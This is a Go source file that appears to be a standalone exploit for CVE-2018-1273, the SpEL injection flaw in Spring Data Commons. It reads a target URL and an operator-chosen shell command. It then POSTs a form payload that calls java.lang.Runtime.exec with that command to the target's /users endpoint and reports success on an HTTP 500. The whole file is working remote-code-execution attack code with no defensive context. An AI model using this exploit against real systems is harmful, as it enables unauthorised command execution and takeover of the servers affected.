package main

import (
	"bufio"
	"fmt"
	"net/http"
	"os"
	"strings"
)

func Cve_2018_1273() {
	fmt.Println("[*] cve-2018-1273 test starting")

	reader1 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input url:")
	url, _, err := reader1.ReadLine()
	if err != nil {
		panic(err)
	}
	reader2 := bufio.NewReader(os.Stdin)
	fmt.Print("[*] input commond:")
	commond, _, err := reader2.ReadLine()
	if err != nil {
		panic(err)
	}

	payload := fmt.Sprintf("username[#this.getClass().forName('java.lang.Runtime').getRuntime().exec('%s')]=&password=&repeatedPassword=", commond)

	var client http.Client
	req1, err := http.NewRequest("POST", string(url)+"/users", strings.NewReader(payload))
	if err != nil {
		panic(err)
	}
	req1.Header.Add("Host", "localhost:8080")
	req1.Header.Add("Connectio", "keep-alive")
	req1.Header.Add("Content-Length", "120")
	req1.Header.Add("Pragma", "no-cache")
	req1.Header.Add("Cache-Control", "no-cache")
	req1.Header.Add("Origin", "http://localhost:8080")
	req1.Header.Add("Upgrade-Insecure-Requests", "1")
	req1.Header.Add("Content-Type", "application/x-www-form-urlencoded")
	req1.Header.Add("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/64.0.3282.186 Safari/537.36")
	req1.Header.Add("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8")
	req1.Header.Add("Referer", "http://localhost:8080/users?page=0&size=5")
	req1.Header.Add("Accept-Encoding", "gzip, deflate, br")
	req1.Header.Add("Accept-Language", "zh-CN,zh;q=0.9,en;q=0.8")
	rep1, err := client.Do(req1)
	if err != nil {
		panic(err)
	}
	fmt.Println(rep1.Status)
	if strings.Contains(rep1.Status, "500") {
		fmt.Println("[+] successfully")
	} else {
		fmt.Println("[-] failure")
	}
}
